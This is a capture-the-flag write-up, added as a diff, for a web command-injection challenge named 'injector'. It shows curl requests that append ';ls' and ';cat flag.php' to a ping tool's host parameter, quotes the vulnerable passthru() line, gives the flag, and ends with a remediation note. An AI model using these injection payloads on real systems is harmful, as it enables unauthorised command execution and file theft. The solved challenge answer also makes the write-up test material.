@@ -1,0 +1,43 @@
+# injector
+- Challenge type: Web — Command Injection
+- Goal: Bypass a network diagnostic tool to execute arbitrary OS commands and read internal files.
+
+## Commands:
+
+- curl -I http://34.40.70.104:31190
+- curl → command-line tool for transferring data
+- -I → fetch only the HTTP headers
+- Purpose: Detect the 302 Found response and the `Location` header redirecting to `index.php?host=127.0.0.1`.
+
+- curl -s "http://34.40.70.104:31190/index.php?host=127.0.0.1;ls"
+- "URL" → quotes prevent the terminal from misinterpreting the `;` character
+- ; → shell command separator (allows executing `ls` after the `ping` command finishes)
+- ls → lists files in the current directory
+- Purpose: Identify existing files on the server, resulting in `flag.php` and `index.php`.
+
+- curl -s "http://34.40.70.104:31190/index.php?host=127.0.0.1;cat+flag.php"
+- cat → displays file content
+- + → URL encoding for a space
+- Purpose: Read the raw content of `flag.php` to obtain the flag.
+
+- curl -s "http://34.40.70.104:31190/index.php?host=127.0.0.1;cat+index.php"
+- Purpose: Extract the source code to perform a root cause analysis of the vulnerability.
+
+---
+
+### Vulnerable Code Snippet (PHP):
+- `passthru("ping -c 2 " . $_GET['host']);`
+- The vulnerability exists because user input from `$_GET['host']` is directly concatenated into a system command without any sanitization of shell metacharacters (like `;`).
+
+---
+
+### Answer:
+- CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}
+
+---
+
+#### Notes:
+- 127.0.0.1 is the universal **localhost** (loopback) address; used here to provide a valid argument to the `ping` command.
+- The `302 Found` status code indicates a redirection; `curl -L` can be used to follow it automatically, but `-I` is better for initial discovery.
+- `passthru()` is a dangerous PHP function because it executes external programs and displays raw output.
+- To prevent this, developers should use `escapeshellarg()` or avoid executing shell commands directly from user input.
